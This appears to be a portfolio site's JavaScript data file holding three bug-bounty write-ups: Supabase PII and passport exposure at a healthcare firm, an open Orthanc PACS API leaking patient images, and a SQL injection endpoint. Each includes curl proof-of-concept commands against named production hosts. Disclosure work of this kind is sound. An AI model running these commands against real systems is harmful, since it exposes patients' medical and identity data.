export const caseStudies = {
  carenium: {
    kicker: "Bug bounty · Finding 01",
    title: "Carenium Healthcare — anonymous KYC & passport data disclosure",
    badges: [
      { label: "Critical", tone: "critical" },
      { label: "CVSS 9.1" },
      { label: "Client-assisted PT" },
      { label: "Disclosed" },
    ],
    meta: "Target: www.carenium.in · Next.js on Vercel + Supabase · 2026-09-13",
    sections: [
      {
        title: "Executive summary",
        content: (
          <>
            <p>
              The production web app embedded its Supabase <strong>anonymous API key</strong> in
              publicly served JavaScript bundles. That key granted unauthenticated read access to the{" "}
              <code>profiles</code> table via PostgREST, exposing the complete PII of registered users:
              passport photographs, avatars, full street addresses, mobile numbers, emails, Aadhaar
              and PAN numbers, membership card numbers and health-related columns. A public storage
              bucket also exposed passport scans.
            </p>
            <p>
              The exposure required no account, no credentials and no session. It was reproduced
              end-to-end and preserved for disclosure.
            </p>
          </>
        ),
      },
      {
        title: "Methodology",
        content: (
          <ol className="case-list">
            <li>
              <strong>Recon</strong> — host enumeration, stack fingerprinting via headers and HTML:
              Next.js on Vercel.
            </li>
            <li>
              <strong>Client-side analysis</strong> — downloaded{" "}
              <code>_next/static/chunks/*.js</code> and grepped for endpoints and keys; recovered the
              Supabase URL and anon JWT.
            </li>
            <li>
              <strong>API discovery</strong> — probed REST (<code>/rest/v1</code>), GraphQL, edge
              functions and storage endpoints.
            </li>
            <li>
              <strong>Validation</strong> — confirmed disclosure, enumerated sensitive columns,
              counted populated rows, decoded embedded base64 images and verified anonymous object
              download.
            </li>
            <li>
              <strong>Write-path testing</strong> — attempted INSERT/UPDATE/upload; all denied by RLS.
            </li>
          </ol>
        ),
      },
      {
        title: "Impact at assessment time",
        content: (
          <>
            <ul className="case-list">
              <li>
                <code>passport_photo_url</code> populated for 9 users (8 embedded base64, 1 in public
                storage) — full passport images recoverable.
              </li>
              <li>
                <code>aadhar_number</code> 10 rows · <code>pan_number</code> 6 · <code>email</code>{" "}
                38/38 · <code>phone</code> 20 · <code>mobile</code> 16 ·{" "}
                <code>carenium_card_number</code> 10.
              </li>
              <li>Full postal addresses and contact numbers, cross-referenceable with names and photos.</li>
              <li>
                Health fields (allergies, chronic conditions, blood group) exposed in violation of
                healthcare-data expectations.
              </li>
            </ul>
            <p className="case-callout">
              Identity fraud: passport photo + Aadhaar + PAN + address + phone in one payload per
              victim — enough to open accounts, apply for loans or bypass KYC elsewhere.
            </p>
          </>
        ),
      },
      {
        title: "Proof of concept (redacted)",
        content: (
          <>
            <pre className="case-code">
              <code>{`# 1. anon key recovered from public JS bundles
grep -rhoE 'eyJ[A-Za-z0-9_-]{20,}\\.[A-Za-z0-9_-]{20,}\\.[A-Za-z0-9_-]{20,}' _next/static/chunks/*.js

# 2. enumerate users + passport photos (no credentials)
curl -s "https://<proj>.supabase.co/rest/v1/profiles?select=id,full_name,aadhar_number,pan_number,phone,email,address,passport_photo_url&passport_photo_url=not.is.null" \\
  -H "apikey: <anon>" -H "Authorization: Bearer <anon>"

# 3. passport image exfiltration (embedded base64 or public-bucket URL)`}</code>
            </pre>
            <p className="case-fineprint">Actual sensitive values (PII) intentionally excluded.</p>
          </>
        ),
      },
      {
        title: "Remediation",
        content: (
          <ul className="case-list">
            <li>Move data access behind a server-side API; remove the anon key from client bundles.</li>
            <li>
              Restrict RLS on <code>profiles</code>: anon may not select PII columns; scope to{" "}
              <code>auth.uid() = id</code> and mask sensitive fields.
            </li>
            <li>
              Make storage private and serve short-lived signed URLs; stop storing base64 images
              in-table.
            </li>
            <li>Remove the GPS schema from the readable surface and add anonymous-read volume alerting.</li>
          </ul>
        ),
      },
    ],
  },

  dekco: {
    kicker: "Bug bounty · Finding 02",
    title: "Dekco — unauthenticated Orthanc PACS admin API exposes patient PHI",
    badges: [
      { label: "Critical", tone: "critical" },
      { label: "CWE-285" },
      { label: "Report #73328074" },
      { label: "Under review" },
    ],
    meta: "Target: zfp-direct.dekco.ai · Orthanc 1.12.7 · Scope: pacs.dekco.ai",
    sections: [
      {
        title: "Summary",
        content: (
          <>
            <p>
              The Dekco imaging viewer proxies an <strong>Orthanc DICOM server</strong> whose full
              admin REST API (<code>/orthanc/*</code>) is publicly reachable with no authentication.{" "}
              <code>/orthanc/system</code> confirmed <code>IsHttpServerSecure: false</code> and{" "}
              <code>ReadOnly: false</code>.
            </p>
            <p>
              Any internet user can enumerate and download real patients' demographics and raw
              medical images, and — because the server is not read-only — modify, delete or inject
              studies. Verified against two independent patients.
            </p>
          </>
        ),
      },
      {
        title: "Proof of concept",
        content: (
          <>
            <pre className="case-code">
              <code>{`# 1. confirm the API is open and writable
curl "https://zfp-direct.dekco.ai/orthanc/system"
# 200 OK → "IsHttpServerSecure": false, "ReadOnly": false

# 2. enumerate every resource ID
curl "https://zfp-direct.dekco.ai/orthanc/changes" | jq -r '.Changes[] | "\\(.ResourceType)\\t\\(.ID)"'

# 3. download a full study and a raw DICOM image, no auth
curl -o study.zip "https://zfp-direct.dekco.ai/orthanc/studies/<id>/archive"
curl -o img.dcm   "https://zfp-direct.dekco.ai/orthanc/instances/<id>/file"`}</code>
            </pre>
            <p className="case-fineprint">Patient details redacted for privacy.</p>
          </>
        ),
      },
      {
        title: "Security impact",
        content: (
          <ul className="case-list">
            <li>
              <strong>Confidentiality (critical):</strong> mass exposure of real patient PHI — name,
              ID, date of birth, sex, institution, referring physician, study details — plus the
              images themselves, with zero credentials.
            </li>
            <li>
              <strong>Integrity (high):</strong> <code>ReadOnly: false</code> permits bulk delete,
              modify, anonymise and create-dicom.
            </li>
            <li>
              <strong>Availability:</strong> bulk deletion or resource exhaustion disrupts imaging
              access.
            </li>
            <li>
              <strong>Network pivot / SSRF:</strong> DICOM modalities and C-MOVE can be aimed at
              internal hosts.
            </li>
            <li>
              <strong>Regulatory:</strong> real-patient health data exposure (India DPDP Act and
              equivalents).
            </li>
          </ul>
        ),
      },
      {
        title: "Recommendations",
        content: (
          <ul className="case-list">
            <li>Enable Orthanc authentication and disable anonymous REST access.</li>
            <li>
              Put <code>/orthanc/*</code> behind an authenticated proxy/WAF allowlisted to the trusted
              viewer origin.
            </li>
            <li>
              Set <code>ReadOnly: true</code> on the exposed path; never expose admin endpoints.
            </li>
            <li>
              Treat as a breach — audit the changes feed, rotate credentials and follow notification
              obligations.
            </li>
            <li>
              Verify the fix: unauthenticated <code>/orthanc/*</code> requests must return 401/403.
            </li>
          </ul>
        ),
      },
    ],
  },

  vibinex: {
    kicker: "Bug bounty · Finding 03",
    title: "Vibinex — unauthenticated SQL injection and database write",
    badges: [
      { label: "High", tone: "high" },
      { label: "CWE-89" },
      { label: "Report #80036429" },
      { label: "Under review" },
    ],
    meta: "Target: vibinex.com · POST /api/dpu/aliases · Vercel-hosted",
    sections: [
      {
        title: "Summary",
        content: (
          <>
            <p>
              <code>POST /api/dpu/aliases</code> constructs an{" "}
              <strong>unparameterised SQL UPDATE</strong> from attacker-controlled values (
              <code>repo_name</code>, <code>repo_owner</code>, <code>repo_provider</code>,{" "}
              <code>aliases</code>). The endpoint is also reachable without authentication — unlike
              other <code>/api/*</code> handlers, it never calls <code>getServerSession</code>.
            </p>
            <p>
              A single quote produced a measurable HTTP 200 vs 500 differential, demonstrating that
              attacker input reaches the query unescaped. Further testing showed an error-based
              oracle that can infer database contents, including user records and OAuth data stored
              in <code>auth_info</code>.
            </p>
          </>
        ),
      },
      {
        title: "Proof of concept",
        content: (
          <pre className="case-code">
            <code>{`# 1. baseline — benign request
curl -si https://vibinex.com/api/dpu/aliases -X POST \\
  -H 'Content-Type: application/json' \\
  --data '{"repo_name":"repo","repo_owner":"owner","repo_provider":"github","aliases":["a@b.c"]}'
# HTTP/2 200

# 2. injection trigger — single quote in aliases
curl -si https://vibinex.com/api/dpu/aliases -X POST \\
  -H 'Content-Type: application/json' \\
  --data '{"repo_name":"repo","repo_owner":"owner","repo_provider":"github","aliases":["x\\u0027"]}'
# HTTP/2 500 → {"error":"Unable to save aliases to DB"}

# 3. second injectable field — quote in repo_name
--data-raw '{"repo_name":"x\\u0027","repo_owner":"o","repo_provider":"github","aliases":["a@b.c"]}'`}</code>
          </pre>
        ),
      },
      {
        title: "Impact",
        content: (
          <ul className="case-list">
            <li>
              Arbitrary SQL execution against the application database, confirmed via a 200/500
              differential.
            </li>
            <li>
              Tampering with <code>repos.aliases</code> — data that drives reviewer-relevance and PR
              comment generation — poisoning the core review logic.
            </li>
            <li>
              Reading alias/identity mappings for any repository via the unauthenticated GET,
              enabling team and account enumeration.
            </li>
            <li>
              Potential exposure of users and stored OAuth tokens in <code>auth_info</code>.
            </li>
          </ul>
        ),
      },
      {
        title: "Remediation",
        content: (
          <ul className="case-list">
            <li>
              Convert <code>utils/db/aliases.ts</code> to parameterised statements — never
              concatenate user input into SQL.
            </li>
            <li>Require authentication/authorisation on every <code>/api/dpu/*</code> endpoint.</li>
            <li>Strictly validate repo fields and alias values (for example an email allowlist regex).</li>
            <li>Restrict DPU endpoints to the trusted service layer and review storage of OAuth tokens.</li>
          </ul>
        ),
      },
    ],
  },
};
